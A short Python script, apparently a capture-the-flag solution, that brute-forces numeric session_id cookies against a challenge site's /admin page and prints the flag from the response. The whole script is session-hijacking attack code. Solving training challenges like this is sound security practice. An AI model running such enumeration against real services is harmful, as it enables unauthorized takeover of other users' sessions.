import requests

url = 'http://too-small-reminder.challs.olicyber.it/'
cookies = {}
for i in range(0,5000):
    cookies['session_id'] = str(i)
    resp = requests.get(url+'admin', cookies=cookies).text
    if (resp.find('flag{') != -1):
        print(resp[resp.find('flag{') : resp.find('}') + 1])